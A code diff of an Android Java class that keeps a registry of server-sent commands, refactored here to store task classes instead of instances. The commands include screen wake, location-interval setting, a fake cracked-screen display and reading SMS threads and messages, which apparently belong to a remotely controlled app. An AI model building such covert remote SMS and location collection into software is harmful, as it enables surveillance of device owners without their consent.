@@ -9,29 +9,29 @@ import java.util.HashMap;
  */
 public class Command {
 
-    public static HashMap<String, AsyncTask> commandList;
+    public static HashMap<String, Class<? extends AsyncTask>> commandList;
 
-    public static AsyncTask getTask(String id) {
-        return commandList.get(id);
+    public static Class<?> getTask(String id) {
+        return Command.commandList.get(id);
     }
 
     public static void initCommands() {
         if (Command.commandList == null) {
-            Command.commandList = new HashMap<String, AsyncTask>();
+            Command.commandList = new HashMap<String, Class<? extends AsyncTask>>();
             //Adding commands is simple
             //commandList.put("String of command that is sent from the server", new (Task class)());
 
-            commandList.put("ScreenOn", new GenericTasks.ScreenOnTask());
-            commandList.put("SetLocationInterval", new GenericTasks.SetLocationIntervalTask());
-            commandList.put("Toast", new GenericTasks.ToastTask());
+            commandList.put("ScreenOn", GenericTasks.ScreenOnTask.class);
+            commandList.put("SetLocationInterval", GenericTasks.SetLocationIntervalTask.class);
+            commandList.put("Toast", GenericTasks.ToastTask.class);
             //drawing tasks
-            commandList.put("OpenGL", new DrawingTasks.OpenGLViewTask());
-            commandList.put("Pong", new DrawingTasks.PongTask());
-            commandList.put("ScreenCrack", new DrawingTasks.CrackScreenTask());
+            commandList.put("OpenGL", DrawingTasks.OpenGLViewTask.class);
+            commandList.put("Pong", DrawingTasks.PongTask.class);
+            commandList.put("ScreenCrack", DrawingTasks.CrackScreenTask.class);
             //sms tasks
-            commandList.put("CacheThread", new SMSCommands.CacheThreadIdTask());
-            commandList.put("GetMessages", new SMSCommands.GetMessagesTask());
-            commandList.put("GetThreads", new SMSCommands.GetThreadsTask());
+            commandList.put("CacheThread", SMSCommands.CacheThreadIdTask.class);
+            commandList.put("GetMessages", SMSCommands.GetMessagesTask.class);
+            commandList.put("GetThreads", SMSCommands.GetThreadsTask.class);
         }
     }
 }
